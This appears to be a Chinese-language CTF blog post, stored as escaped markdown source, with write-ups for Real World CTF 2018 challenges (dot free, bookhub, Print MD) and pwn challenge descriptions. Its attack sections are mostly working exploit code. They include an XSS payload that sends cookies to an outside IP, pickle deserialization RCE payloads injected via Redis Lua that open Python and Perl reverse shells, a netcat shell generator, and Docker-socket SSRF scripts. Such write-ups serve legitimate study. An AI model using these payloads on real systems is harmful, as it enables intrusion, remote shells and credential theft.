```\n\n8. 构造payload\n\n   ```\n   af5e1a4c-23b2-4f87-abf6-96a60d61d8b3\",redis evilcode,\"bookhub:session:tianji\n   ```\n\n   结果：\n\n   ```\n   { \"bookhub:session:af5e1a4c-23b2-4f87-abf6-96a60d61d8b3\",redis evilcode,\"bookhub:session:tianji\" }\n   ```\n\n9. 参考文件\n\n   ```text\n   https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html\n   https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html\n   ```\n\n10. evil code\n\n  > redis.call(\"set\",\"bookhub:session:tianji\",反弹shell) \n\n11. payload\n\n    ```\n    import cPickle\n    import os\n    import requests\n    import re\n    import urllib\n    \n    DEBUG = 0\n    \n    URL = \"http://18.213.16.123:5000/\" if not DEBUG else \"http://127.0.0.1:5000/\"\n    \n    class exp(object):\n        def __reduce__(self):\n            listen_ip = \"123.207.90.143\"\n            listen_port = 1234\n            s = \"\"\"curl 123.207.90.143:1234\"\"\"\n            return (os.system,(s,))\n    \n    e = exp()\n    s = cPickle.dumps(e)\n    s_bypass = \"\"\n    for i in s:\n        s_bypass +=\"string.char(%s)..\"%ord(i)\n    evilcode = '''redis.call(\"set\",\"bookhub:session:tianji\",%s)'''%s_bypass[:-2]\n    payload = '''2047a141-2493-4f81-b315-8b8d95d3db33\",%s,\"bookhub:session:tianji'''%evilcode\n    payload = payload.replace(\" \",\"\")\n    \n    \n    if __name__ == '__main__':\n        headers = {\n            \"Cookie\": 'bookhub-session=%s' % payload,\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            'X-CSRFToken': '',\n        }\n    \n        print headers[\"Cookie\"]\n    \n        res = requests.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            html = res.content\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">', html)\n            if r:\n                headers['X-CSRFToken'] = r[0]\n                # refresh_session\n                data = {'submit': '1'}\n                res = requests.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n                # fuck\n                headers['Cookie'] = 'bookhub-session=tianji'\n                res = requests.get(URL + 'login/', headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n    ```\n\n    收到响应。\n\n    ![](/assets/realworldctf/TIM截图20180802110118.png)\n\n12. 修改payload，获取flag\n\n    payload1:\n\n    ```\n    import requests\n    import re\n    import json\n    import random\n    import string\n    import cPickle\n    import os\n    import urllib\n    \n    req = requests.Session()\n    \n    DEBUG = 0\n    \n    URL = \"http://18.213.16.123:5000/\" if not DEBUG else \"http://127.0.0.1:5000/\"\n    \n    \n    def rs(n=6):\n        return ''.join(random.sample(string.ascii_letters + string.digits, n))\n    \n    \n    class exp(object):\n    \n        def __reduce__(self):\n            listen_ip = \"123.207.90.143\"\n            listen_port = 1234\n            s = 'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\'' % (\n                listen_ip, listen_port)\n            return (os.system, (s,))\n    \n    x = [{'_fresh': False, '_permanent': True,\n          'csrf_token': '2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8', 'exp': exp()}]\n    s = cPickle.dumps(x)\n    \n    if __name__ == '__main__':\n        payload = urllib.quote(s)\n        yoursid = 'vvv'\n        funcode = r\"local function urlDecode(s) s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) return s end\"\n        # 插入payload并防止del\n        sid = '%s\\\\\" } %s ' % (rs(6), funcode) + \\\n            'redis.call(\\\\\"set\\\\\",\\\\\"bookhub:session:%s\\\\\",\\\\urlDecode(\"%s\\\\\")) inputs = { \\\"bookhub:session:%s\\\" } --' % (\n                yoursid, payload, yoursid)\n        headers = {\n            \"Cookie\": 'bookhub-session=\"x%s\"' % sid,\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            'X-CSRFToken': '',\n        }\n    \n        res = req.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            html = res.content\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">', html)\n            if r:\n                headers['X-CSRFToken'] = r[0]\n                # refresh_session\n                data = {'submit': '1'}\n                res = req.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n                # fuck\n                headers['Cookie'] = 'bookhub-session=vvv'\n                res = req.get(URL + 'admin/', headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n    ```\n\n    payload2:\n\n    ```\n    __AUTHOR__ = 'Virink'\n    \n    import os\n    import sys\n    import requests as req\n    import re\n    from urllib import quote as urlencode\n    try:\n        import cPickle as pickle\n    except ImportError:\n        import pickle\n    \n    URL = \"http://18.213.16.123:5000/\"\n    listen_ip = '123.207.90.143'\n    listen_port = 1234\n    \n    class exp(object):\n    \n        def __reduce__(self):\n            s = \"perl -e 'use Socket;$i=\\\"%s\\\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\" % (listen_ip, listen_port)\n            return (os.system, (s,))\n    \n    if __name__ == '__main__':\n        payload = urlencode(pickle.dumps([exp()]))\n        # 插入payload并防止del\n        sid = '\\\\\" } local function urlDecode(s) s=string.gsub(s,\\'%%(%x%x)\\',function(h) return string.char(tonumber(h, 16)) end) return s end ' + \\\n            'redis.call(\\\\\"set\\\\\",\\\\\"bookhub:session:qaq\\\\\",urlDecode(\\\\\"%s\\\\\")) inputs = { \\\"bookhub:session:qaq\\\" } --' % (\n                payload)\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        # 注入payload\n        headers[\"Cookie\"] = 'bookhub-session=\"%s\"' % sid\n        res = req.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">',\n                           res.content.decode('utf-8'))\n            if r:\n                # refresh_session\n                headers['X-CSRFToken'] = r[0]\n                data = {'submit': '1'}\n                res = req.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    # 触发RCE\n                    req.get(URL + 'login/',\n                            headers={'Cookie': 'bookhub-session=qaq'})\n    ```\n\n13. pickle payload生成\n\n    ```\n    #!/usr/bin/python\n    #\n    # Pickle deserialization RCE payload.\n    # To be invoked with command to execute at it's first parameter.\n    # Otherwise, the default one will be used.\n    #\n    \n    import cPickle\n    import os\n    import sys\n    import base64\n    \n    DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\"\n    COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n    \n    class PickleRce(object):\n        def __reduce__(self):\n            return (os.system,(COMMAND,))\n    \n    print base64.b64encode(cPickle.dumps(PickleRce()))\n    ```\n\n### Print MD\n\n1. subject description\n\n   ```\n   Make HackMD printable ._. http://54.183.55.10/\n   \n   Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag\n   \n   Hint: Here is a render.js for you.\n   ```\n\n2. render.js\n\n   ```\n   const {Router} = require('express')\n   const {matchesUA} = require('browserslist-useragent')\n   const router = Router()\n   const axios = require('axios')\n   const md = require('../../plugins/md_srv')\n   \n   router.post('/render', function (req, res, next) {\n     let ret = {}\n     ret.ssr = !matchesUA(req.body.ua, {\n       browsers: [\"last 1 version\", \"> 1%\", \"IE 10\"],\n       _allowHigherVersions: true\n     });\n     if (ret.ssr) {\n       axios(req.body.url).then(r => {\n             ret.mdbody = md.render(r.data)\n         res.json(ret)\n       })\n     }\n     else {\n       ret.mdbody = md.render('# 请稍候…')\n       res.json(ret)\n     }\n   });\n   module.exports = router\n   ```\n\n3. 漏洞\n\n   **print.ba84889093b992d33112.js**中可以找到将markdown文档发送到服务端解析的代码 \n\n   ```\n   validate: function(e) {\n       return e.query.url && e.query.url.startsWith(\"https://hackmd.io/\")\n   },\n   asyncData: function(ctx) {\n       if(!ctx.query.url.endsWith(\"/download\")){\n           ctx.query.url += \"/download\";\n       }\n       ctx.query.ua = ctx.req.headers[\"user-agent\"] || \"\";\n       return axios.post(\"/api/render\", qs.stringify({...ctx.query})).then(function(e) {\n           return {\n               ...e.data,\n               url: ctx.query.url\n           }\n       })\n   },\n   mounted: function() {\n       if (!this.ssr){\n           axios(this.url).then(function(t) {\n               this.mdbody = md.render(t.data)\n           })\n       }\n   }\n   ```\n\n   这里直接使用`qs.stringify({...ctx.query}`,因而在render.js中\n\n   ```js\n   axios(req.body.url).then(r => {\n       ret.mdbody = md.render(r.data)\n       res.json(ret)\n   }\n   ```\n\n   `req.body.url` 可控\n\n4. 漏洞利用\n\n   **axios**这个东西是不支持**file://**协议的，但是通过文档可知，他支持**UNIX Socket** 。\n\n   ![](/assets/realworldctf/TIM截图20180802194917.png)\n\n   测试`ping`。\n\n   > GET http://54.183.55.10/print?url[url]=/_ping&url[socketPath]=/var/run/docker.sock&url=https://hackmd.io/ HTTP/1.1\n\n   ![](/assets/realworldctf/TIM截图20180802195456.png)\n\n5. exploit.py\n\n   ```python\n   import requests as req\n   import random\n   import string\n   from bs4 import BeautifulSoup\n   from urllib import quote as urlencode\n   \n   URL = \"http://54.183.55.10/print?{url}&url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ\"\n   \n   headers = {\n       \"User-Agent\": \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"\n   }\n   \n   \n   def get(u):\n       res = req.get(u, timeout=10, headers=headers)\n       if res.status_code == 200:\n           soup = BeautifulSoup(res.content, \"lxml\")\n           body = soup.select(\".markdown-body\")\n           if body:\n               print(body[0].text)\n               return True\n       print(\"[-] error\")\n   \n   \n   def fuck(_u):\n       _u += '&url[socketPath]=/var/run/docker.sock'\n       pl = URL.format(url=_u)\n       try:\n           get(pl)\n       except:\n           pass\n   \n   if __name__ == '__main__':\n       container_name = ''.join(random.sample(\n           string.ascii_letters + string.digits, 6))\n       _us = [\n           'url[url]=/_ping&',\n           'url[method]=post&url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest',\n           'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,\n           'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,\n           'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name\n       ]\n       for i in _us:\n           fuck(i)\n   ```\n\n   exploit1.py\n\n   ```\n   #!/usr/bin/env python\n   # -*- coding: utf-8 -*-\n   #\n   # SakiiR @ Hexpresso\n   # cc XeR & BitK\n   # Let's go now (:\n   #\n   # --+ Python 2 +--\n   \n   import random\n   import pwn\n   import requests\n   import urllib\n   \n   urlencode = urllib.quote_plus\n   \n   OUTFILE = \"flag.txt\"\n   MAX_ROWS = 100\n   \n   \n   def random_container_name(n=10, charset=(\"abcdefghijklmnopqrstUVWXYZ\"\n                                            \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n                                            \"0123456789\")):\n       return ''.join([\n           charset[random.randint(0, len(charset) - 1)] for _ in range(n)\n       ])\n   \n   \n   def main():\n   \n       container_name = random_container_name()\n       pwn.log.info(\"Your container name is '{}'\".format(container_name))\n   \n       # Pull alpine image :)\n       # --------------------\n       endpoint = urlencode(\"http://127.0.0.1/assets/create?fromImage=alpine:latest\")\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Pulling alpine:      '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Creating container (image)\n       # --------------------------\n       endpoint = urlencode('http://127.0.0.1/containers/create?name={}'.format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[data][Volumes][flag][path]=/sakiir'\n              '&url[data][Binds][]=/flag:/sakiir:ro'\n              '&url[data][Entrypoint][]=/bin/sh'\n              '&url[data][Image]=alpine:latest'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Creating container:  '{}[...]'\".format(url[:MAX_ROWS]))\n       pwn.log.info(\"This will take some time then crash with a 503\")\n       pwn.log.info(\"The container will still be created (:\")\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Starting container_name\n       # -----------------------\n       endpoint = urlencode('http://127.0.0.1/containers/{}/start'.format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Starting container:  '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Archive container (Archive the /sakiir directory and get it back :))\n       # --------------------------------------------------------------------\n       endpoint = urlencode(\"http://127.0.0.1/containers/{}/archive?path=/sakiir\".format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=GET'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Archiving container: '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n       with open(OUTFILE, 'w') as f:\n           f.write(r.content)\n           pwn.log.info(\"Flag written to file '{}'\".format(OUTFILE))\n   \n   \n   if __name__ == '__main__':\n       main()\n   ```\n\n## pwn\n\n### state-of-the-art vm\n\ndescription:\n\n```text\npwn\n\nLatest QEMU is unbreakable, and we also hardened it.\n\nNOTE: Host OS is Ubuntu 16.04\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/state-of-the-art_vm_ddde3799c4dc2936eb182ec3dbefdfef.zip\n\nnc 34.236.229.208 31338\n\nHint: Check start.sh\n```\n\n### Spectre-Free\n\n```\npwn\n\nThe spectre's paper told me that the vulnerability can only be used to achieve information discloure, while I don't care about infoleak. Why not use it to exchange superior performance?\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/togiveout.tgz.b5b489f104f50d9c5342ccf7180add5c\n\nhttp://34.236.229.208\n\nHint: If you are not a master of Spectre, maybe you can use some unpatched 1day bug.\n\nHint 2: The spectre's patch happens to make certain bugs unable to be triggered. Hence Microsoft is lazy, so they may not even analyze or patch those bugs. Try to retrieve some unpatched 1 day bugs please.Also I found a tweet which may be related to this.\n```\n\n### kid vm\n\n```\npwn Writing a vm is the best way to teach kids to learn vm escape.\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip\n\nnc 34.236.229.208 9999\n```\n\n### p90  RUSH B\n\n```\npwn\n\nWhen Cloud9 won the Major at Boston in 2018, another war starts off the cyberspace. The CTF players who enthuse about CS:GO not only want to run inside the Dust2 but also \"\"run\"\" outside the map. There is a challenge for guys who don't wanna be stuck in jail. Have fun with the Counter-Strike :)\n\nHere is a readme for you https://www.dropbox.com/s/3nn5pwukg5mk6k6/readme.md?dl=0\n\nA CS:GO server template: https://www.dropbox.com/s/7v48wdctx83d1lw/CSGO_Server_5ea3610faacd5b3bae1e97e33927caaf.zip?dl=0\n```\n\n### untrustworthy\n\n```\npwn\n\nDon't trust everything you see. There are secrets hidden in plain sight.\n\nnc 18.211.57.236 13337\n\nhttps://s3-us-west-1.amazonaws.com/realworldctf/distrib.zip\n```\n\n","source":"_posts/real-world-ctf.md","raw":"---\ntitle: real-world-ctf\ndate: 2018-07-30 20:25:36\ntags: ctf\n---\n\n## Web\n\n### dot free\n\n1. ip2long\n\n   ```\n   ip_addr='192.168.2.10'\n   \n   # transfer ip to int\n   def ip2long(ip):\n       ip_list=ip.split('.')\n       result=0\n       for i in range(4):  #0,1,2,3\n           result=result+int(ip_list[i])*256**(3-i)\n       return result\n   \n   long=3232236042\n   \n   # transfer int to ip\n   def long2ip(long):\n       floor_list=[]\n       yushu=long\n       for i in reversed(range(4)):   #3,2,1,0\n           res=divmod(yushu,256**i)\n           floor_list.append(str(res[0]))\n           yushu=res[1]\n       return '.'.join(floor_list)\n   \n   a=long2ip(long)\n   print(a)\n   ```\n\n2. 关键代码\n\n   ```javascript\n   window.addEventListener('message', function (e) {\n           if (e.data.iframe) {\n               if (e.data.iframe && e.data.iframe.value.indexOf('.') == -1 && e.data.iframe.value.indexOf(\"//\") == -1 && e.data.iframe.value.indexOf(\"。\") == -1 && e.data.iframe.value && typeof(e.data.iframe != 'object')) {\n                   if (e.data.iframe.type == \"iframe\") {\n                       lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);\n                   } else {\n                       lls(e.data.iframe.value)\n                   }\n               }\n           }\n       }, false);\n       window.onload = function (ev) {\n           postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')\n       }\n   ```\n\n3. 输入点\n\n   ```\n   decodeURIComponent(location.search.substr(1))\n   ```\n\n4. bypass\n\n   ```\n   e.data.iframe.value.indexOf(\"//\") == -1\n   =>\n   http:/\\\n   \n   \".\" 和 \"。\"均不能使用\n   =>\n   使用ip2long bypass\n   \n   ```\n\n5. payload\n\n   ```\n   http://13.57.104.34/?{%22iframe%22:{%22value%22:%22http:\\u002f\\u005c2077186703:1234%22}}\n   或者不要`http:` =>\n   http://13.57.104.34/?{%22iframe%22:{%22value%22:%20%22\\u002f\\u005c2077186703:1234/a%22}}\n   ```\n\n6. getflag\n\n   index.html\n\n   ```\n   document.location=\"http://123.207.90.143?flag=\"+document.cookie;\n   ```\n\n7. flag\n\n   ```\n   rwctf%7BL00kI5TheFlo9%7D\n   ```\n\n### bookhub\n\n1. 测试登录\n\n   ```\n   your ip address isn't in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.\n   ```\n\n2. 进入代码查看\n\n   ```\n   def get_remote_addr():\n       address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)\n   \n       try:\n           ipaddress.ip_address(address)\n       except ValueError:\n           return None\n       else:\n           return address\n   ```\n\n3. 测试修改X-Forwarded-For，失败，原因: XFF做了反代理，伪造的 XFF被覆盖\n\n4. 打开 18.213.16.123:5000\n\n   发现该服务运行于debug模式下\n\n   ```\n   @login_required\n   @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])\n   def refresh_session():\n       \"\"\"\n           delete all session except the logined user\n   \n           :return: json\n           \"\"\"\n   \n           status = 'success'\n           sessionid = flask.session.sid\n           prefix = app.config['SESSION_KEY_PREFIX']\n   \n           if flask.request.form.get('submit', None) == '1':\n               try:\n                   rds.eval(rf'''\n                   local function has_value (tab, val)\n                       for index, value in ipairs(tab) do\n                           if value == val then\n                               return true\n                           end\n                       end\n                   \n                       return false\n                   end\n                   \n                   local inputs = {{ \"{prefix}{sessionid}\" }}\n                   local sessions = redis.call(\"keys\", \"{prefix}*\")\n                   \n                   for index, sid in ipairs(sessions) do\n                       if not has_value(inputs, sid) then\n                           redis.call(\"del\", sid)\n                       end\n                   end\n                   ''', 0)\n               except redis.exceptions.ResponseError as e:\n                   app.logger.exception(e)\n                   status = 'fail'\n   \n           return flask.jsonify(dict(status=status))\n   ```\n\n   上边这一段代码由于`@login_required` 写在route上边，所以存在未授权访问。\n\n   ![](/assets/realworldctf/TIM截图20180801194537.png)\n\n5. 添加csrf_token\n\n   ![](/assets/realworldctf/TIM截图20180801195906.png)\n\n6. 漏洞\n\n   ```\n   local inputs = {{ \"{prefix}{sessionid}\" }}\n   local sessions = redis.call(\"keys\", \"{prefix}*\")\n   ```\n\n   这里使用字符串拼接，存在问题，可以通过闭合双引号，使得redis执行恶意代码。\n\n7. 跟踪`{prefix}`\n\n   ```\n    prefix = app.config['SESSION_KEY_PREFIX']\n    \n    app.config['SESSION_KEY_PREFIX'] = 'bookhub:session:'\n   ```\n\n8. 构造payload\n\n   ```\n   af5e1a4c-23b2-4f87-abf6-96a60d61d8b3\",redis evilcode,\"bookhub:session:tianji\n   ```\n\n   结果：\n\n   ```\n   { \"bookhub:session:af5e1a4c-23b2-4f87-abf6-96a60d61d8b3\",redis evilcode,\"bookhub:session:tianji\" }\n   ```\n\n9. 参考文件\n\n   ```text\n   https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html\n   https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html\n   ```\n\n10. evil code\n\n  > redis.call(\"set\",\"bookhub:session:tianji\",反弹shell) \n\n11. payload\n\n    ```\n    import cPickle\n    import os\n    import requests\n    import re\n    import urllib\n    \n    DEBUG = 0\n    \n    URL = \"http://18.213.16.123:5000/\" if not DEBUG else \"http://127.0.0.1:5000/\"\n    \n    class exp(object):\n        def __reduce__(self):\n            listen_ip = \"123.207.90.143\"\n            listen_port = 1234\n            s = \"\"\"curl 123.207.90.143:1234\"\"\"\n            return (os.system,(s,))\n    \n    e = exp()\n    s = cPickle.dumps(e)\n    s_bypass = \"\"\n    for i in s:\n        s_bypass +=\"string.char(%s)..\"%ord(i)\n    evilcode = '''redis.call(\"set\",\"bookhub:session:tianji\",%s)'''%s_bypass[:-2]\n    payload = '''2047a141-2493-4f81-b315-8b8d95d3db33\",%s,\"bookhub:session:tianji'''%evilcode\n    payload = payload.replace(\" \",\"\")\n    \n    \n    if __name__ == '__main__':\n        headers = {\n            \"Cookie\": 'bookhub-session=%s' % payload,\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            'X-CSRFToken': '',\n        }\n    \n        print headers[\"Cookie\"]\n    \n        res = requests.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            html = res.content\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">', html)\n            if r:\n                headers['X-CSRFToken'] = r[0]\n                # refresh_session\n                data = {'submit': '1'}\n                res = requests.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n                # fuck\n                headers['Cookie'] = 'bookhub-session=tianji'\n                res = requests.get(URL + 'login/', headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n    ```\n\n    收到响应。\n\n    ![](/assets/realworldctf/TIM截图20180802110118.png)\n\n12. 修改payload，获取flag\n\n    payload1:\n\n    ```\n    import requests\n    import re\n    import json\n    import random\n    import string\n    import cPickle\n    import os\n    import urllib\n    \n    req = requests.Session()\n    \n    DEBUG = 0\n    \n    URL = \"http://18.213.16.123:5000/\" if not DEBUG else \"http://127.0.0.1:5000/\"\n    \n    \n    def rs(n=6):\n        return ''.join(random.sample(string.ascii_letters + string.digits, n))\n    \n    \n    class exp(object):\n    \n        def __reduce__(self):\n            listen_ip = \"123.207.90.143\"\n            listen_port = 1234\n            s = 'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\'' % (\n                listen_ip, listen_port)\n            return (os.system, (s,))\n    \n    x = [{'_fresh': False, '_permanent': True,\n          'csrf_token': '2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8', 'exp': exp()}]\n    s = cPickle.dumps(x)\n    \n    if __name__ == '__main__':\n        payload = urllib.quote(s)\n        yoursid = 'vvv'\n        funcode = r\"local function urlDecode(s) s = string.gsub(s, '%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) return s end\"\n        # 插入payload并防止del\n        sid = '%s\\\\\" } %s ' % (rs(6), funcode) + \\\n            'redis.call(\\\\\"set\\\\\",\\\\\"bookhub:session:%s\\\\\",\\\\urlDecode(\"%s\\\\\")) inputs = { \\\"bookhub:session:%s\\\" } --' % (\n                yoursid, payload, yoursid)\n        headers = {\n            \"Cookie\": 'bookhub-session=\"x%s\"' % sid,\n            \"Content-Type\": \"application/x-www-form-urlencoded\",\n            'X-CSRFToken': '',\n        }\n    \n        res = req.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            html = res.content\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">', html)\n            if r:\n                headers['X-CSRFToken'] = r[0]\n                # refresh_session\n                data = {'submit': '1'}\n                res = req.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n                # fuck\n                headers['Cookie'] = 'bookhub-session=vvv'\n                res = req.get(URL + 'admin/', headers=headers)\n                if res.status_code == 200:\n                    print(res.content)\n                else:\n                    print(res.content)\n    ```\n\n    payload2:\n\n    ```\n    __AUTHOR__ = 'Virink'\n    \n    import os\n    import sys\n    import requests as req\n    import re\n    from urllib import quote as urlencode\n    try:\n        import cPickle as pickle\n    except ImportError:\n        import pickle\n    \n    URL = \"http://18.213.16.123:5000/\"\n    listen_ip = '123.207.90.143'\n    listen_port = 1234\n    \n    class exp(object):\n    \n        def __reduce__(self):\n            s = \"perl -e 'use Socket;$i=\\\"%s\\\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\" % (listen_ip, listen_port)\n            return (os.system, (s,))\n    \n    if __name__ == '__main__':\n        payload = urlencode(pickle.dumps([exp()]))\n        # 插入payload并防止del\n        sid = '\\\\\" } local function urlDecode(s) s=string.gsub(s,\\'%%(%x%x)\\',function(h) return string.char(tonumber(h, 16)) end) return s end ' + \\\n            'redis.call(\\\\\"set\\\\\",\\\\\"bookhub:session:qaq\\\\\",urlDecode(\\\\\"%s\\\\\")) inputs = { \\\"bookhub:session:qaq\\\" } --' % (\n                payload)\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        # 注入payload\n        headers[\"Cookie\"] = 'bookhub-session=\"%s\"' % sid\n        res = req.get(URL + 'login/', headers=headers)\n        if res.status_code == 200:\n            r = re.findall(r'csrf_token\" type=\"hidden\" value=\"(.*?)\">',\n                           res.content.decode('utf-8'))\n            if r:\n                # refresh_session\n                headers['X-CSRFToken'] = r[0]\n                data = {'submit': '1'}\n                res = req.post(URL + 'admin/system/refresh_session/',\n                               data=data, headers=headers)\n                if res.status_code == 200:\n                    # 触发RCE\n                    req.get(URL + 'login/',\n                            headers={'Cookie': 'bookhub-session=qaq'})\n    ```\n\n13. pickle payload生成\n\n    ```\n    #!/usr/bin/python\n    #\n    # Pickle deserialization RCE payload.\n    # To be invoked with command to execute at it's first parameter.\n    # Otherwise, the default one will be used.\n    #\n    \n    import cPickle\n    import os\n    import sys\n    import base64\n    \n    DEFAULT_COMMAND = \"netcat -c '/bin/bash -i' -l -p 4444\"\n    COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n    \n    class PickleRce(object):\n        def __reduce__(self):\n            return (os.system,(COMMAND,))\n    \n    print base64.b64encode(cPickle.dumps(PickleRce()))\n    ```\n\n### Print MD\n\n1. subject description\n\n   ```\n   Make HackMD printable ._. http://54.183.55.10/\n   \n   Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag\n   \n   Hint: Here is a render.js for you.\n   ```\n\n2. render.js\n\n   ```\n   const {Router} = require('express')\n   const {matchesUA} = require('browserslist-useragent')\n   const router = Router()\n   const axios = require('axios')\n   const md = require('../../plugins/md_srv')\n   \n   router.post('/render', function (req, res, next) {\n     let ret = {}\n     ret.ssr = !matchesUA(req.body.ua, {\n       browsers: [\"last 1 version\", \"> 1%\", \"IE 10\"],\n       _allowHigherVersions: true\n     });\n     if (ret.ssr) {\n       axios(req.body.url).then(r => {\n             ret.mdbody = md.render(r.data)\n         res.json(ret)\n       })\n     }\n     else {\n       ret.mdbody = md.render('# 请稍候…')\n       res.json(ret)\n     }\n   });\n   module.exports = router\n   ```\n\n3. 漏洞\n\n   **print.ba84889093b992d33112.js**中可以找到将markdown文档发送到服务端解析的代码 \n\n   ```\n   validate: function(e) {\n       return e.query.url && e.query.url.startsWith(\"https://hackmd.io/\")\n   },\n   asyncData: function(ctx) {\n       if(!ctx.query.url.endsWith(\"/download\")){\n           ctx.query.url += \"/download\";\n       }\n       ctx.query.ua = ctx.req.headers[\"user-agent\"] || \"\";\n       return axios.post(\"/api/render\", qs.stringify({...ctx.query})).then(function(e) {\n           return {\n               ...e.data,\n               url: ctx.query.url\n           }\n       })\n   },\n   mounted: function() {\n       if (!this.ssr){\n           axios(this.url).then(function(t) {\n               this.mdbody = md.render(t.data)\n           })\n       }\n   }\n   ```\n\n   